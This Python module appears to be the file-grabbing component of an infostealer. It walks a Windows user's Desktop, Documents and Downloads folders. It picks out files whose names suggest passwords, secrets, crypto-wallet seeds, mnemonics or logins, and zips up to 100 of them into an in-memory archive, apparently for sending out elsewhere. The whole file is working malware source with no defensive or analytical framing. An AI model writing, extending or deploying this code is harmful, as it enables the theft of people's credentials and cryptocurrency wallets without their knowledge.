import os
import shutil
import tempfile
import zipfile
import io
from .utils import expand_path

KEYWORDS = ['pass', 'word', 'secret', 'key', 'seed', 'wallet', 'recovery', 'mnemonic', 'login', 'account', 'auth', 'database']
EXTENSIONS = ['.txt', '.log', '.doc', '.docx', '.pdf', '.xlsx', '.csv', '.rdp', '.py', '.js', '.json', '.sql']

def search_files():
    found_files = []
    search_paths = [
        os.path.join(os.environ['USERPROFILE'], 'Desktop'),
        os.path.join(os.environ['USERPROFILE'], 'Documents'),
        os.path.join(os.environ['USERPROFILE'], 'Downloads')
    ]
    
    for base_path in search_paths:
        if not os.path.exists(base_path):
            continue
            
        for root, dirs, files in os.walk(base_path):
            if root.count(os.sep) - base_path.count(os.sep) > 2:
                continue
                
            for file in files:
                file_lower = file.lower()
                name, ext = os.path.splitext(file_lower)
                
                if ext in EXTENSIONS:
                    if any(keyword in name for keyword in KEYWORDS):
                        file_path = os.path.join(root, file)
                        try:
                            if os.path.getsize(file_path) < 5 * 1024 * 1024:
                                found_files.append(file_path)
                        except:
                            pass
    return found_files

def grab_files():
    files = search_files()
    if not files:
        return None
    
    try:
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for file_path in files[:100]:
                try:
                    rel_path = file_path.replace(os.environ['USERPROFILE'], 'USER_HOME')
                    zipf.write(file_path, arcname=rel_path)
                except:
                    pass
        
        zip_buffer.seek(0)
        return zip_buffer.getvalue()
    except:
        return None
